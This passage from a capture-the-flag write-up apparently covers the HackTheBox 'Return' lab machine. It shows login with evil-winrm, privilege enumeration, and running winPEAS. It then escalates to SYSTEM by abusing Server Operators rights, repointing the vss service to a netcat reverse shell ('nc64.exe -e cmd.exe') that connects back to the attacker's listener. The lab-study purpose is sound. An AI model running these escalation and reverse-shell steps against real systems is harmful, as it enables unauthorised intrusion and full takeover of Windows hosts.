Using the credentials uncovered with `nc`, the attacker can log onto the target
```
└─$ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1<SNIP>!!'
<SNIP>
```

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

# Winpeas
### Uploading
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload ../../usr/share/peass/winpeas/winPEASx64.exe .
                                        
Info: Uploading /home/kali/../../usr/share/peass/winpeas/winPEASx64.exe to C:\Users\svc-printer\Documents\.                                               
                                        
Data: 13541376 bytes of 13541376 bytes copied
                                        
Info: Upload successful!

```

### Running
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> .\winPEASx64.exe > win.txt

```

### Downloading
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> download win.txt /home/kali/win.txt
                                        
Info: Downloading C:\Users\svc-printer\Documents\win.txt to /home/kali/win.txt                                                                            
                                        
Info: Download successful!

```

### converting to readable format on linux
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Return]
└─$ iconv -f UTF-16 -t UTF-8 win.txt -o win-svc-printer-utf8.txt

```

winpeas was interesting, but the most effecient way forward is to exploit the groups that `svc-printer` is a part of.
# Permissions
BUILTIN\Server Operators should allow the user to start and stop services

## Uploading a netcat payload
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc64.exe
                                        
Info: Uploading /home/kali/Payloads/nc.exe/nc64.exe to C:\Users\svc-printer\Documents\nc64.exe                                                            
                                        
Data: 60360 bytes of 60360 bytes copied

```

## Obtaining a system shell
```
### Attacker - set up a listener
└─$ nc -lvnp 1337
listening on [any] 1337 ...

### target - launch the netcat shell.
# the vss service is repointed to the payload,
# then vss is restarted
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc64.exe -e cmd.exe 10.10.14.14 1337"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss

### Attacker - catch the connection
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.108] 49922
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```